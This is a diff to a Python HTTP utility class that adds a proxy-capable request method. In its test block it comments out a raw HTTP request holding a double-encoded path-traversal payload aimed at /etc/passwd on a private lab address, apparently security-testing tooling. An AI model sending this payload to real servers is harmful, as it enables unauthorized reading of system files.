@@ -1,4 +1,8 @@
+import urllib.request
+
 import requests
+import socket
+import socks
 from urllib.parse import urlparse, urlencode, parse_qs
 from copy import deepcopy
 
@@ -26,6 +30,19 @@ class HTTPTools:
         except requests.exceptions.RequestException as e:
             print(f"post请求error: {e}")
             return None
+
+    @staticmethod
+    def send_http_request(url, request_data=None, headers=None, proxy_method='http',proxies=None):
+        if proxies:  # 如果传入了代理地址和端口
+            http_proxy_handler = urllib.request.ProxyHandler({proxy_method: proxies})
+            opener = urllib.request.build_opener(http_proxy_handler)
+        else:  # 如果没有传入代理地址和端口
+            opener = urllib.request.build_opener()
+
+        request = urllib.request.Request(url=url, headers=headers, data=request_data)
+        response = opener.open(request)
+        print(response.read().decode('utf-8'))
+
 
 
     @staticmethod
@@ -116,20 +133,21 @@ if __name__ == "__main__":
     # # print(http_tool.update_url(http_tool.get_argv(url)[0],http_tool.get_argv(url)[1],"name","1"))
     # par = {"name":"","submit":"12"}
     # print(http_tool.update_url_parameters(http_tool.get_argv(url)[0],http_tool.get_argv(url)[1],par))
-    host = "192.168.52.128"
-    port = 8080
-    raw_request = """
-        GET /icons/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd HTTP/1.1
-Content-Length: 517
-Host: 192.168.52.128:8080
-User-Agent: Mozilla/5.0 (X11; FreeBSD i386 6.73; rv:220.59) Gecko/20100101 Chrome/175.28 OPR/220.59;
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate
-Connection: close
-Upgrade-Insecure-Requests: 1
-If-Modified-Since: Thu, 14 Oct 2021 06:00:45 GMT
-If-None-Match: "29cd-5ce49cca73d40-gzip"
-Cache-Control: max-age=0
-    """
-    print(http_tool.send_http_message(host, port, raw_request))
+#     host = "192.168.52.128"
+#     port = 8080
+#     raw_request = """
+#         GET /icons/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd HTTP/1.1
+# Content-Length: 517
+# Host: 192.168.52.128:8080
+# User-Agent: Mozilla/5.0 (X11; FreeBSD i386 6.73; rv:220.59) Gecko/20100101 Chrome/175.28 OPR/220.59;
+# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+# Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+# Accept-Encoding: gzip, deflate
+# Connection: close
+# Upgrade-Insecure-Requests: 1
+# If-Modified-Since: Thu, 14 Oct 2021 06:00:45 GMT
+# If-None-Match: "29cd-5ce49cca73d40-gzip"
+# Cache-Control: max-age=0
+#     """
+#     print(http_tool.send_http_message(host, port, raw_request))
+
